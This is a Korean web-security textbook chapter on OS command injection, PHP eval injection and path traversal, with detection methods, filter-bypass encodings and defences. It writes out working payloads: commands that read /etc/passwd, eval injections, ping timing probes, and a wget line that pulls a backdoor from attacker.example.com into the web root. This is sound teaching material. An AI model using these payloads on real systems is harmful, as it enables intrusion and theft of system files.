# 28장. 백엔드 컴포넌트 공격: 명령, 경로, XML, 요청

> **이 장에서 다루는 것**
>
> - 사용자 입력이 데이터베이스가 아니라 운영체제 셸·파일시스템·XML 파서·바깥으로 나가는 HTTP 요청에 직접 도달할 때 무엇이 되는지
> - 경로 순회의 우회 기법이 왜 새로운 발명이 아니라 7장 인코딩·정규화 논의의 응용인지
> - XXE와 Billion Laughs를 네 겹으로 — 공격의 구조, 파서 설정, "필요 없는 기능은 끈다"는 설계 마인드셋, 그리고 설정 하나에 기대지 않는 심층 방어 — 로 다루는 법
> - 서버가 임의의 주소로 커넥션을 여는 순간 방화벽 안쪽이 공격 표면이 되는 이유, 그리고 주소 표기의 다양성이 왜 필터를 무력화하는지
> - 같은 결함이 GraphQL 리졸버라는 새 진입점에서 어떻게 재현되는지

앞 장(27장)은 사용자 입력이 서버 안에서 **데이터 저장소**를 겨냥할 때 무엇이 되는지를 다뤘다. SQL, NoSQL, XPath, LDAP — 이들은 모두 해석되는 언어였고, 인젝션의 본질은 데이터와 구분자가 같은 채널을 공유한다는 하나의 구조였다. 그러나 데이터 저장소는 애플리케이션이 이야기를 나누는 여러 백엔드 컴포넌트 중 **하나**일 뿐이다.

애플리케이션은 데이터베이스에만 질의를 던지지 않는다. 그것은 운영체제에 명령을 내리고, 파일시스템에서 파일을 읽고, XML 문서를 파싱하고, 다른 서버로 HTTP 요청을 보내고, 메일 서버와 SMTP 대화를 나눈다. 데이터가 한 컴포넌트에서 다른 컴포넌트로 넘어갈 때, 그것은 서로 다른 API와 인터페이스가 해석한다. 핵심 애플리케이션이 "안전하다"고 여긴 데이터가 다음 컴포넌트 안에서는 극도로 위험할 수 있다. 그 컴포넌트는 다른 인코딩, 다른 이스케이프 문자, 다른 필드 구분자, 다른 문자열 종결 방식을 지원하기 때문이다. 게다가 그 컴포넌트는 애플리케이션이 평소 호출하는 것보다 훨씬 많은 기능을 갖고 있다. 인젝션을 익스플로잇하는 공격자는 애플리케이션의 접근 제어를 깨는 데서 그치지 않고, 백엔드 컴포넌트가 지원하는 추가 기능을 딛고 조직 인프라의 핵심을 장악할 수 있다.

27.7절에서 우리는 데이터베이스를 **경유해** 운영체제에 이르렀다. SQL 인젝션으로 데이터베이스에 도달한 뒤, 데이터베이스가 가진 OS 접근 기능(`xp_cmdshell`, `utl_file`, `INTO OUTFILE`)을 딛고 넘어갔다. 이 장은 데이터베이스를 건너뛴다. 애플리케이션이 사용자 입력을 **직접** 셸 명령이나 파일 경로나 XML 파서나 바깥 HTTP 요청에 넣을 때 생기는 일을 다룬다. 두 장은 같은 목적지(운영체제, 그리고 그 너머의 인프라)에 이르지만, **경유하는 중간 컴포넌트가 다르다.** 이 차이를 붙잡는 것이 이 장을 읽는 열쇠다.

실행 예제는 앞 장에 이어 온라인 서점(`www.example-books.com`)이다. 다만 이 장의 취약점 상당수는 관리 인터페이스 — 서버·방화벽·프린터·라우터를 웹으로 관리하는 기능 — 에서 특히 자주 나타나므로, 서점의 관리자 백오피스가 반복해서 무대가 된다.

## 28.1 OS 명령 인젝션 — Perl·ASP 사례, 동적 실행을 통한 인젝션

대부분의 웹 서버 플랫폼은 운영체제와의 거의 모든 상호작용을 안전하게 수행할 수 있는 내장 API를 갖추도록 진화해 왔다. 파일시스템 접근, 다른 프로세스와의 연동, 네트워크 통신 — 이 모든 것에 안전한 API가 있다. 그럼에도 개발자는 종종 더 무겁고 직접적인 방법, 즉 **운영체제 명령을 서버에 곧장 발행하는 방식**을 택한다. 강력하고 단순하며, 당면한 문제에 즉각적이고 작동하는 해법을 주기 때문이다. 그러나 애플리케이션이 사용자가 공급한 입력을 운영체제 명령에 실어 보내는 순간, **명령 인젝션(command injection)** 의 조건이 갖춰진다.

운영체제 명령을 발행하는 데 흔히 쓰이는 함수 — PHP의 `exec`, ASP의 `wscript.shell` — 은 수행 가능한 명령의 범위에 아무런 제약을 두지 않는다. 개발자가 디렉터리 내용을 나열하는 것처럼 비교적 무해한 작업을 의도했더라도, 공격자는 그것을 전복해 임의의 파일을 쓰거나 다른 프로그램을 실행할 수 있다. 주입된 명령은 대개 **웹 서버 프로세스의 보안 컨텍스트**에서 실행되며, 이 권한은 공격자가 서버 전체를 장악하기에 충분한 경우가 많다.

이런 종류의 명령 인젝션 결함은 기성·맞춤 웹 애플리케이션 모두에서 무수히 발견돼 왔다. 특히 엔터프라이즈 서버나 방화벽·프린터·라우터 같은 장치의 관리 인터페이스를 제공하는 애플리케이션에서 두드러진다. 이런 애플리케이션은 운영체제와의 상호작용 요구가 특수해서, 개발자가 사용자 데이터를 품은 직접 명령을 쓰게 되기 때문이다.

> **27.7절과의 경계.** 여기서 다루는 것은 애플리케이션이 사용자 입력을 **곧장** 셸에 넣는 경우다. 27.7절은 SQL 인젝션으로 데이터베이스에 먼저 도달한 뒤 데이터베이스의 `xp_cmdshell` 같은 기능을 통해 운영체제로 넘어가는 경우였다. 둘 다 운영체제 명령 실행에 이르지만, 이 장에서는 데이터베이스가 경로에 없다. 데이터 진입점을 식별할 때(→ 25.5) 이 구별을 유지해야 한다.

### 예제 1 — Perl을 통한 인젝션

서버 관리용 웹 애플리케이션의 일부인 다음 Perl CGI 코드를 보자. 이 기능은 관리자가 서버의 디렉터리를 지정하면 그 디스크 사용량 요약을 보여 준다.

```perl
#!/usr/bin/perl
use strict;
use CGI qw(:standard escapeHTML);
print header, start_html("");
print "<pre>";

my $command = "du -h --exclude php* /var/www/html";
$command = $command . param("dir");
$command = `$command`;
print "$command\n";
print end_html;
```

의도대로 쓰이면 이 스크립트는 사용자가 공급한 `dir` 파라미터 값을 미리 정해진 명령 끝에 이어 붙여 실행하고, 그 결과를 표시한다. 예컨대 `dir=/public`을 주면 `du -h --exclude php* /var/www/html/public`이 실행돼 그 디렉터리의 용량 요약이 나온다.

이 기능은 **셸 메타문자(shell metacharacter)** 를 담은 입력으로 다양하게 익스플로잇할 수 있다. 메타문자는 명령을 처리하는 인터프리터에게 특별한 의미를 가지며, 개발자가 의도한 명령에 간섭하는 데 쓰인다. 예를 들어 파이프 문자(`|`)는 한 프로세스의 출력을 다른 프로세스의 입력으로 넘겨 여러 명령을 사슬로 잇는다. 공격자는 이 동작을 이용해 두 번째 명령을 주입하고 그 출력을 되받을 수 있다.

```
dir=|cat /etc/passwd
```

이렇게 하면 최종 명령은 `du -h --exclude php* /var/www/html|cat /etc/passwd`가 되고, 원래 `du` 명령의 출력이 `cat /etc/passwd`의 입력으로 넘어간다. 이 명령은 넘어온 입력을 무시하고 자기 할 일 — passwd 파일 내용을 출력하는 것 — 만 한다.

이렇게 단순한 공격이 실제로 통할 것 같지 않아 보이지만, 정확히 이런 유형의 명령 인젝션이 수많은 상용 제품에서 발견됐다. HP OpenView는 다음 URL 안에서 명령 인젝션 결함이 발견된 바 있다.

```
https://target:3443/OvCgi/connectedNodes.ovpl?node=a|[명령]|
```

### 예제 2 — ASP를 통한 인젝션

이번에는 웹 서버 관리용 애플리케이션의 일부인 C# 코드를 보자. 관리자가 요청한 디렉터리의 내용을 보여 주는 기능이다.

```csharp
string dirName = "C:\\filestore\\" + Directory.Text;
ProcessStartInfo psInfo = new ProcessStartInfo("cmd", "/c dir " + dirName);
Process proc = Process.Start(psInfo);
```

의도대로면 이 코드는 사용자가 공급한 `Directory` 값을 미리 정해진 명령에 삽입해 실행하고 결과를 표시한다. Perl 스크립트와 마찬가지로 공격자는 셸 메타문자로 미리 정해진 명령에 간섭할 수 있다. Windows 명령 인터프리터에서 앰퍼샌드(`&`)는 여러 명령을 일괄 처리하는 데 쓰인다. 앰퍼샌드와 두 번째 명령을 담은 디렉터리 이름을 공급하면 그 명령이 실행되고 결과가 표시된다.

```
Directory=x & whoami
```

플랫폼에 따라 메타문자의 처리가 다르다는 점을 강조해야 한다. **원리상 어떤 개발 플랫폼이나 웹 서버든 어떤 셸 인터프리터든 호출할 수 있다.** 그 인터프리터는 자기 운영체제에서 돌 수도, 다른 호스트에서 돌 수도 있다. 따라서 웹 서버의 운영체제를 안다고 해서 메타문자 처리 방식을 넘겨짚어서는 안 된다.

### 동적 실행을 통한 인젝션

많은 웹 스크립트 언어는 런타임에 생성된 코드를 **동적으로 실행(dynamic execution)** 하는 기능을 지원한다. 개발자는 이 기능으로 데이터와 조건에 따라 자기 코드를 스스로 수정하는 애플리케이션을 만든다. 사용자 입력이 동적으로 실행되는 코드에 섞여 들어가면, 공격자는 의도된 데이터 컨텍스트를 탈출해 서버에서 실행될 명령을 지정하는 입력을 만들 수 있다. 그렇게 실행된 명령은 원래 개발자가 작성한 것과 똑같이 취급된다. 이 시점에서 공격자의 첫 표적은 대개 **OS 명령을 실행하는 API를 주입하는 것**이다.

PHP의 `eval` 함수는 런타임에 넘겨받은 코드를 동적으로 실행한다. 사용자가 저장된 검색을 만들면 그것이 UI 안에 링크로 동적 생성되는 검색 기능을 생각해 보자. 사용자는 다음과 같은 URL로 검색 기능에 접근한다.

```
/search.php?storedsearch=$mysearch%3dwahh
```

서버 측 애플리케이션은 저장된 검색 파라미터에 담긴 이름/값 쌍으로 변수를 동적으로 생성해 이 기능을 구현한다. 여기서는 값이 `wahh`인 `mysearch` 변수가 만들어진다.

```php
$storedsearch = $_GET['storedsearch'];
eval("$storedsearch;");
```

이 상황에서 공격자는 `eval`이 동적 실행할 입력을 만들어 서버 측 애플리케이션에 임의의 PHP 명령을 주입할 수 있다. 세미콜론은 한 파라미터 안에서 명령을 일괄 처리하는 데 쓰인다. 예컨대 `/etc/passwd` 내용을 얻으려면 `file_get_contents`나 `system` 명령을 쓴다.

```
/search.php?storedsearch=$mysearch%3dwahh;%20echo%20file_get_contents('/etc/passwd')
/search.php?storedsearch=$mysearch%3dwahh;%20system('cat%20/etc/passwd')
```

Perl에도 같은 방식으로 익스플로잇되는 `eval` 함수가 있다. 세미콜론은 URL 인코딩(`%3b`)해야 할 수 있다. 일부 CGI 스크립트 파서가 이를 파라미터 구분자로 해석하기 때문이다. 클래식 ASP에서는 `Execute()`가 비슷한 역할을 한다.

동적 실행이 위험한 것은, 이것이 27장에서 본 인젝션 구조의 가장 극단적인 형태이기 때문이다. SQL 인젝션에서 공격자는 SQL 인터프리터의 문법을 딛고 데이터를 명령으로 승격시켰다. 동적 실행에서는 인터프리터가 애플리케이션을 쓴 바로 그 언어의 인터프리터다. 데이터가 곧장 프로그램 명령이 된다. 중간 번역이 없는 만큼 위력도 크다.

## 28.2 OS 명령·스크립트 인젝션 탐지와 방어

### 명령 인젝션 결함 찾기

애플리케이션 매핑(→ 25장) 단계에서 애플리케이션이 외부 프로세스를 호출하거나 파일시스템에 접근하는 등 하부 운영체제와 상호작용하는 것으로 보이는 지점을 식별해 두었을 것이다. 이런 기능을 모두 탐침해야 한다. 그러나 사실 애플리케이션은 **모든** 사용자 데이터 — 모든 URL·본문 파라미터, 모든 쿠키 — 를 운영체제 명령에 실을 수 있다. 철저한 테스트를 하려면 모든 기능 안의 이 모든 항목을 표적으로 삼아야 한다.

별개의 명령을 기존 명령에 주입하는 데 쓰이는 메타문자는 크게 두 부류다.

- **일괄 처리 문자** `;` `|` `&` 그리고 개행. 이들은 여러 명령을 잇달아 처리하게 한다. 어떤 경우엔 문자를 겹쳐 효과를 바꾼다. Windows 명령 인터프리터에서 `&&`는 첫 명령이 성공해야 두 번째가 돌게 하고, `||`는 첫 명령의 성공 여부와 무관하게 두 번째를 돌게 한다.
- **백틱 문자** `` ` ``. 원래 명령이 처리하는 데이터 항목 안에 별개의 명령을 감싸 넣는다. 주입한 명령을 백틱으로 감싸면 셸 인터프리터가 그것을 먼저 실행하고, 감싼 텍스트를 그 결과로 치환한 뒤 이어서 결과 명령 문자열을 실행한다.

앞선 예제에서는 주입 결과가 응답에 곧장 반환돼 인젝션 가능 여부와 결과 확인이 쉬웠다. 그러나 많은 경우 그렇지 않다. 결과를 반환하지 않고 후속 처리에도 식별 가능한 영향을 주지 않는 명령에 주입하고 있을 수 있고, 여러 명령을 일괄 처리하다 결과가 사라질 수도 있다.

이럴 때 명령 인젝션 가능 여부를 판별하는 가장 신뢰할 만한 방법은 **시간 지연 추론(time-delay inference)** 이다. 블라인드 SQL 인젝션을 익스플로잇할 때와 같은 원리다(→ 27.6). `ping` 명령으로 서버가 루프백 인터페이스를 일정 시간 핑하게 해 지연을 유발한다. Windows와 UNIX는 명령 구분자와 `ping` 옵션 처리가 조금 다르므로, 필터가 없다면 어느 쪽에서든 30초 지연을 일으키는 만능 테스트 문자열은 다음과 같다.

```
| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
```

특정 구분자를 애플리케이션이 거르는 경우까지 대비하려면 개행 기반 변형도 각 파라미터에 넣어 응답 시간을 관찰한다.

```
%0a ping -i 30 127.0.0.1 %0a
```

지연이 발생하면 여러 번 반복해 네트워크 지연이나 다른 변수 때문이 아님을 확인한다. `-n`이나 `-i` 값을 바꿔 지연이 그에 따라 체계적으로 변하는지 보면 더 확실하다. 그다음 성공한 주입 문자열로 `ls`나 `dir` 같은 더 흥미로운 명령을 주입해 결과를 브라우저로 되받을 수 있는지 본다.

결과를 직접 되받을 수 없다면 다른 선택지가 있다. **대역 외(out-of-band) 채널**을 자기 컴퓨터로 여는 것 — TFTP로 도구를 서버에 올리거나, telnet·netcat으로 리버스 셸을 만들거나, `mail` 명령으로 출력을 SMTP로 보내는 것 — 이 한 방법이다. 또는 명령 출력을 웹 루트 안 파일로 돌린 뒤 브라우저로 직접 가져오는 방법도 있다.

```
dir > c:\inetpub\wwwroot\foo.txt
```

명령 주입과 결과 회수 방법을 찾았으면 `whoami` 등으로 권한 수준을 파악한다. 그다음 권한 상승, 민감 데이터로의 백도어 접근, 침해된 서버에서 도달 가능한 다른 호스트 공격으로 나아간다.

### 별개 명령을 주입할 수 없을 때 — 명령 인자·리다이렉션

필터나 API 동작 때문에 완전히 별개의 명령을 주입할 수 없어도, 수행 중인 명령의 동작에 간섭해 원하는 결과를 얻을 수 있다. 저자들이 본 한 사례에서, 애플리케이션은 사용자가 준 도메인 이름의 IP를 찾으려고 `nslookup` 명령에 입력을 넘겼다. 새 명령을 주입하는 메타문자는 막혔지만, 입출력을 돌리는 `<`와 `>`는 허용됐다.

`nslookup`은 보통 도메인의 IP를 출력하므로 효과적인 공격 벡터로 보이지 않았다. 그러나 유효하지 않은 도메인 이름을 주면 조회한 도메인 이름을 포함한 오류 메시지를 출력했다. 이 동작이 심각한 공격의 발판이 됐다.

- 서버에서 실행 가능한 스크립트 코드 조각을 조회할 도메인 이름으로 제출한다. 인터프리터가 하나의 토큰으로 취급하도록 따옴표로 감싼다.
- `>`로 명령 출력을 웹 루트 안 실행 가능 폴더의 파일로 돌린다.

```
nslookup "[스크립트 코드]" > [/실행가능/파일경로]
```

- 명령이 실행되면 `** server can't find [스크립트 코드]: NXDOMAIN` 같은 출력이 그 파일로 돌아간다.
- 그 파일을 브라우저로 호출하면 주입된 스크립트 코드가 서버에서 실행된다. 대부분의 스크립트 언어가 페이지에 클라이언트 콘텐츠와 서버 마크업을 섞을 수 있어, 공격자가 통제하지 못하는 오류 메시지 부분은 평문으로 취급되고 주입된 스크립트 마크업은 실행된다. **제약된 명령 인젝션 조건이 제약 없는 백도어로 격상된다.**

마찬가지로 많은 운영체제 명령이 동작을 제어하는 명령줄 인자를 받는다. 사용자 입력이 그런 인자로 넘어갈 때 공백에 이어 다른 인자를 덧붙일 수 있다. 예컨대 애플리케이션이 `wget` 프로그램을 호출해 사용자가 지정한 URL을 가져와 편집용으로 렌더링한다면, `wget`의 `-O` 인자를 덧붙여 서버 파일시스템에 임의 내용을 쓸 수 있다.

```
url=http://attacker.example.com/backdoor -O c:\inetpub\wwwroot\scripts\cmd.asp
```

공백이 걸러진다면, UNIX 기반 플랫폼에서는 공백 필드 구분자를 담은 `$IFS` 환경 변수를 공백 대신 쓸 수 있다.

### 동적 실행 취약점 찾기

동적 실행 취약점은 PHP·Perl 같은 언어에서 가장 흔하지만, 원리상 어떤 플랫폼이든 사용자 입력을 스크립트 기반 인터프리터에 — 때로는 다른 백엔드 서버에서 — 넘길 수 있다. 쿠키 파라미터의 이름·값과 사용자 프로필에 저장된 지속 데이터가 특히 자주 동적 실행 함수에 넘어간다. 각 표적 파라미터에 다음 값을 차례로 넣어 본다.

```
;echo%20111111    echo%20111111    response.write%20111111    :response.write%20111111
```

응답에서 `111111`이 (명령 문자열의 나머지 없이) 단독으로 반환되면 스크립트 명령 주입에 취약할 가능성이 크다. 반환되지 않으면 입력이 동적 실행되고 있음을 암시하는 오류 메시지를 찾아 구문을 조정한다. PHP라면 `phpinfo()`가, 성공 시 PHP 환경 설정 정보를 반환해 좋은 확인 도구가 된다. 취약해 보이면 `system('ping%20127.0.0.1')`처럼 시간 지연을 유발하는 명령으로 검증한다.

### OS 명령·스크립트 인젝션 방어

OS 명령 인젝션 결함을 막는 가장 좋은 방법은 **운영체제 명령을 직접 호출하는 것 자체를 피하는 것**이다. 웹 애플리케이션이 수행해야 할 거의 모든 작업은, 의도한 명령 외의 것을 수행하도록 조작될 수 없는 내장 API로 달성할 수 있다.

사용자 데이터를 명령 인터프리터에 넘기는 명령 문자열에 심는 것이 불가피하다고 판단되면, 애플리케이션은 엄격한 방어를 강제해야 한다. 가능하면 **화이트리스트**로 입력을 기대되는 값의 집합으로 제한한다. 그럴 수 없으면 영숫자만처럼 매우 좁은 문자 집합으로 제한하고, 그 밖의 데이터 — 상상할 수 있는 모든 메타문자와 공백 — 를 담은 입력은 거부한다.

추가 방어 층으로, 명령 문자열을 셸 인터프리터에 넘기는 대신 **특정 프로세스를 이름과 명령줄 인자로 실행하는 명령 API**를 쓴다. Java의 `Runtime.exec`, ASP.NET의 `Process.Start`는 셸 메타문자를 지원하지 않는다. 셸을 거치지 않으므로 명령 사슬 잇기나 리다이렉션이 원천적으로 불가능하고, 제대로 쓰면 개발자가 의도한 명령만 실행됨을 보장할 수 있다.

스크립트 인젝션 방어의 원리도 같다. 사용자 입력이나 그로부터 파생된 데이터를 동적 실행이나 인클루드 함수에 넘기지 않는 것이 최선이다. 불가피하면 알려진 정상 값의 화이트리스트로 엄격히 검증하고, 목록에 없는 입력은 거부한다.

> **이 절이 뒷받침하는 것**
>
> - 셸을 거치지 않는 명령 API로 명령 사슬을 원천 차단하는 발상 → **43.6** (거부·정제·안전한 처리·의미론적 검사의 비교에서 "안전한 처리"에 해당)
> - "위험한 문자를 거르지 말고 위험한 값이 존재할 수 없게 하라" → **27.10**, **44.1** (도메인 프리미티브가 검증되지 않은 문자열의 도달 자체를 막는다)

## 28.3 파일 경로 조작 (1) — 경로 순회 취약점, 탐지, 우회, 방어

웹 애플리케이션의 많은 기능이 사용자 입력을 파일·디렉터리 이름으로 처리한다. 대개 입력은 파일 경로를 받는 API에 넘어간다 — 로컬 파일시스템에서 파일을 가져오는 식으로. 입력이 제대로 검증되지 않으면 두 가지 취약점, **경로 순회(path traversal)** 와 파일 인클루전이 생긴다. 이 절은 앞엣것을 다룬다.

경로 순회 취약점은 애플리케이션이 사용자가 통제하는 데이터로 서버(또는 다른 백엔드 파일시스템)의 파일·디렉터리에 안전하지 않게 접근할 때 생긴다. 조작된 입력으로 공격자는 접근되는 파일시스템 어디로든 임의 내용을 읽거나 쓸 수 있다. 이는 서버에서 민감 정보를 읽거나 민감 파일을 덮어쓰게 하고, 궁극적으로는 서버에서 임의 명령 실행으로 이어진다.

다음 예를 보자. 애플리케이션이 동적 페이지로 정적 이미지를 클라이언트에 반환한다. 요청할 이미지 이름은 쿼리 문자열 파라미터로 지정된다.

```
https://www.example-books.com/filestore/GetFile.ashx?filename=cover-1234.jpg
```

서버는 이 요청을 처리하며 (1) 쿼리 문자열에서 `filename` 값을 추출하고, (2) 그것을 접두사 `C:\filestore\`에 이어 붙이고, (3) 그 이름의 파일을 열어, (4) 내용을 읽어 클라이언트에 반환한다.

취약점은 공격자가 `filename`에 **경로 순회 시퀀스**를 넣어 2단계에서 지정된 디렉터리 위로 거슬러 올라가, 애플리케이션의 사용자 컨텍스트가 접근 권한을 가진 서버 어디의 파일에든 도달할 수 있다는 데서 온다. 순회 시퀀스는 흔히 "점-점-슬래시(dot-dot-slash)"라 불린다. 전형적인 공격은 이렇다.

```
https://www.example-books.com/filestore/GetFile.ashx?filename=..\windows\win.ini
```

애플리케이션이 이 값을 이미지 디렉터리 이름에 이어 붙이면 `C:\filestore\..\windows\win.ini`를 얻고, 두 순회 시퀀스가 `filestore` 디렉터리에서 C 드라이브 루트로 거슬러 올라가므로 이는 `C:\windows\win.ini`와 같다. 이미지 대신 Windows 기본 설정 파일이 반환된다.

경로 순회를 탐침할 때는, 어떤 사용자든 읽을 수 있는 기본 파일 — Windows의 `c:\windows\win.ini`, UNIX의 `/etc/passwd` — 을 표적으로 삼는 것이 좋다. 구형 IIS는 기본적으로 로컬 시스템 권한으로 돌아 읽을 수 있는 모든 파일에 접근했지만, 최신 서버는 대개 낮은 권한 컨텍스트로 돌기 때문이다.

### 탐지

경로 순회 테스트 대상을 식별하는 출발점은 애플리케이션 매핑이다. 파일 업로드·다운로드가 명시적 목적인 기능 — 문서 공유 워크플로, 이미지 업로드가 있는 블로그·경매, 전자책·기술 매뉴얼·회사 보고서를 가져오는 정보성 기능 — 은 모두 철저히 테스트한다. 요청 파라미터가 `include=main.inc`나 `template=/en/sidebar`처럼 파일·디렉터리 이름을 담은 것으로 보이거나, 구현상 서버 파일시스템에서 데이터를 가져올 법한 기능(오피스 문서·이미지 표시)이 표적이다(→ 12.4, 리소스 매핑).

각 표적을 개별적으로 테스트한다. 통상 신뢰할 만한 첫 테스트는 **시작 디렉터리 위로 올라가지 않는** 순회 시퀀스를 넣어 보는 것이다. 파라미터가 미리 정해진 디렉터리에 이어 붙는다고 가정하고, 임의의 하위 디렉터리와 순회 시퀀스 하나를 삽입한다.

```
file=foo/file1.txt   →   file=foo/bar/../file1.txt
```

두 경우 동작이 같으면 취약할 수 있다. 곧장 시작 디렉터리 위로 순회해 다른 파일 접근을 시도한다. 동작이 다르면 순회 시퀀스를 막거나 제거·정제하고 있는 것이므로 우회를 검토한다. 이 테스트가 (존재하지 않는 `bar` 디렉터리에도) 유효한 이유는, 대부분의 파일시스템이 파일 경로를 가져오기 전에 **정규화(canonicalization)** 를 수행하기 때문이다. 순회 시퀀스가 지어낸 디렉터리를 상쇄하므로 서버는 그것의 존재를 확인하지 않는다.

거의 모든 파일시스템은 루트 위로 올라가려는 잉여 순회 시퀀스를 관대하게 처리한다. 따라서 시작 디렉터리가 파일시스템 깊숙이 있을 경우의 거짓 음성을 피하려면, 탐침 시 순회 시퀀스를 넉넉하게 많이 넣는 편이 좋다. 또한 Windows는 슬래시와 역슬래시를 모두 디렉터리 구분자로 관대하게 받지만 UNIX는 슬래시만 받으며, 어떤 애플리케이션은 한 버전만 걸러 낸다. UNIX 서버가 확실해도 Windows 기반 백엔드 컴포넌트를 호출할 수 있으므로 **두 버전을 모두 시도**한다.

### 우회 — 7장 인코딩·정규화 논의의 응용

첫 순회 시도가 실패해도 애플리케이션이 안전하다는 뜻은 아니다. 많은 개발자가 경로 순회를 알고 입력 검증을 넣지만, 그 방어는 결함이 많고 우회된다. 그리고 **여기서 쓰는 우회 기법은 새로운 발명이 아니다.** 이들은 모두 7.6~7.7절에서 다룬 인코딩·정규화 문제의 응용이다. 7.7절에서 우리는 입력 검증 메커니즘이 겪는 정규화 문제 — 오버롱 UTF-8, 이중 디코딩 — 를 일반 원리로 정리했다. 여기서는 그 원리가 **파일시스템 맥락**에서 어떤 구체적 변형으로 나타나는지에 집중한다. 원리 자체는 7장을, 이 변형은 이 절을 보면 된다.

가장 흔한 첫 필터는 `filename`이 순회 시퀀스를 담고 있는지 검사해 거부하거나 정제하는 것이다. 다음 우회를 시도한다(모든 슬래시와 점을 빠짐없이 인코딩해야 한다).

**표 28-1. 경로 순회 필터 우회 인코딩 (WAHH 10장 기준)**

| 기법 | 점(`.`) | 슬래시(`/`) | 역슬래시(`\`) |
|---|---|---|---|
| 단순 URL 인코딩 | `%2e` | `%2f` | `%5c` |
| 16비트 유니코드 | `%u002e` | `%u2215` | `%u2216` |
| 이중 URL 인코딩 | `%252e` | `%252f` | `%255c` |
| 오버롱 UTF-8 | `%c0%2e`, `%e0%40%ae`, `%c0ae` | `%c0%af`, `%e0%80%af`, `%c0%2f` | `%c0%5c`, `%c0%80%5c` |

오버롱 UTF-8 표현은 유니코드 규칙을 엄격히 위반하지만, 특히 Windows의 많은 디코더 구현이 그럼에도 받아들인다(→ 7.7, 31.7에서 이 정규화 결함을 다시 다룬다). 애플리케이션이 순회 시퀀스를 **제거**하는데 그 필터를 재귀적으로 적용하지 않으면, 한 시퀀스를 다른 시퀀스 안에 넣어 우회할 수 있다.

```
....//        ....\/        ....\\
```

`....//`에서 애플리케이션이 안쪽 `../`를 한 번 제거하면 남는 것은 정확히 `../`다. 필터가 자기 출력을 다시 검사하지 않는다는 사실이 방어를 뒤집는다.

두 번째로 흔한 필터는 사용자가 준 파일 이름이 애플리케이션이 기대하는 **접미사(파일 타입)** 나 **접두사(시작 디렉터리)** 를 포함하는지 검증하는 것이다. 접미사 검사는 요청 파일 이름 끝에 **URL 인코딩된 널 바이트**를 넣고 그 뒤에 허용되는 타입을 붙여 우회할 수 있다.

```
/boot.ini%00.jpg
```

이 공격이 통하는 이유는 데이터 타입의 불일치다. 파일 타입 검사는 문자열에 널 문자를 허용하는 관리 실행 환경(Java의 `String.endsWith()`)에서 수행되지만, 실제 파일을 가져올 때는 문자열이 널로 종결되는 비관리 환경의 API를 쓴다. 따라서 파일 이름이 원하는 값으로 잘린다. 애플리케이션이 스스로 타입 접미사를 붙이는 경우에도 같은 익스플로잇이 통한다.

접두사 검사 — 파일 이름이 특정 하위 디렉터리로 시작하는지 — 는 쉽게 우회된다.

```
filestore/../../../etc/passwd
```

이 공격들이 개별적으로 성공하지 못하면 여러 필터가 동시에 걸려 있을 수 있다. 그럴 때는 문제를 **분리된 단계로 쪼갠다.** `cover.jpg`는 성공하는데 `foo/../cover.jpg`가 실패하면, 두 번째 요청의 변형을 순회 우회 기법으로 하나씩 시도한다. 순회 우회가 성공해도 `/etc/passwd`에 닿지 못하면, `cover.jpg%00.jpg`로 파일 타입 필터가 있는지, 우회 가능한지 별도로 탐침한다. 시작 디렉터리 안에서 작업하며 각 필터를 개별적으로 파악하고 하나씩 우회한 다음 합친다.

저자들이 본 가장 기이한 사례는 파일 이름에 커스텀 인코딩 스킴을 쓴 경우였다. 애플리케이션은 업로드 파일 이름에 경로 순회 취약점이 있었지만, 이미 존재하는 파일은 덮어쓰기를 거부했고, 다운로드 URL은 각 위치마다 다른 문자 집합을 쓰는 독자적 Base64 유사 난독화로 표현됐다. 실험 결과 난독화된 URL이 원래 파일 이름 문자열을 담고 있었고, 인코딩 전에 경로 정규화가 수행되지 않았다. 공격자는 `/etc/passwd/../../tmp/foo`(정규형은 `/tmp/foo`라 쓰기 가능)를 업로드해 서버가 만들어 준 난독 URL을 얻은 뒤, 그것을 적절한 지점에서 잘라 `/etc/passwd`를 가리키게 했다. **서버가 임의 경로를 자기 스킴으로 인코딩할 자원을 스스로 내준 셈이다.** 이 사례의 교훈은 하나다 — **난독화는 보안의 대체물이 아니다.**

### 익스플로잇

읽기 접근 순회는 흥미로운 파일을 회수하는 데 쓴다 — 운영체제·애플리케이션 패스워드 파일, 다른 취약점을 찾거나 공격을 정교화할 서버·애플리케이션 설정 파일, DB 자격증명을 담은 인클루드 파일, MySQL DB 파일이나 XML 같은 데이터 소스, 서버 실행 페이지의 소스 코드, 사용자명·세션 토큰을 담은 로그 파일. 쓰기 접근 순회의 주 목표는 **서버에서 임의 명령 실행**을 달성하는 것이다 — 사용자 시작 폴더에 스크립트를 만들거나, `in.ftpd` 같은 파일을 수정하거나, 실행 권한이 있는 웹 디렉터리에 스크립트를 쓰고 브라우저로 호출한다.

### 방어

경로 순회를 없애는 가장 효과적인 방법은 **사용자가 제출한 데이터를 어떤 파일시스템 API에도 넘기지 않는 것**이다. 앞의 `GetFile.ashx?filename=cover-1234.jpg` 예처럼, 접근 제어 대상이 아닌 파일은 그냥 웹 루트에 두고 직접 URL로 접근하면 된다. 이것이 불가능하면 애플리케이션이 서비스할 수 있는 파일의 하드코딩된 목록을 두고, 인덱스 번호 같은 다른 식별자로 어느 파일인지 지정한다(→ 35.6의 간접 참조와 같은 발상). 유효하지 않은 식별자를 담은 요청은 거부하고, 사용자가 경로를 조작할 공격 표면 자체를 없앤다.

파일 업로드·다운로드처럼 이름으로 파일을 지정하는 것이 바람직한 경우엔 **심층 방어(defense in depth)** 로 여러 장애물을 놓는다. 가능한 한 다음을 함께 구현한다.

- 사용자가 제출한 파일 이름에 대한 **모든 디코딩과 정규화를 수행한 뒤**, 순회 시퀀스(역슬래시·슬래시 모두)나 널 바이트를 담고 있는지 검사한다. 담고 있으면 처리를 중단한다. **악성 파일 이름에 정제를 시도하지 않는다**(→ 45.6, "검증 전에 복구하지 말라"). 정제는 새로운 우회를 낳는다.
- 허용 파일 타입의 하드코딩된 목록을 쓰고, 위 디코딩·정규화 후에도 다른 타입 요청은 거부한다.
- 사용자 파일 이름에 대한 모든 필터링을 마친 뒤, 적절한 파일시스템 API로 접근할 파일이 애플리케이션이 지정한 시작 디렉터리 안에 있는지 확인한다. Java에서는 `java.io.File` 객체를 만들어 `getCanonicalPath()`를 호출하고, 반환 문자열이 시작 디렉터리 이름으로 시작하지 않으면 거부한다. ASP.NET에서는 `System.IO.Path.GetFullPath()`를 쓴다.

